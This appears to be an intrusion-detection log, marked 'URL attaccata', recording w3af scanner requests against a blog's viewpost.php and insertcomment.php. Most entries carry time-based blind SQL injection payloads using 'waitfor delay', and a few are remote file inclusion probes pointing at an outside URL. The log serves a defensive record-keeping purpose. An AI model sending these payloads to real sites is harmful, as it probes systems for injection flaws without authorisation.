+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 
+
+April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 
+
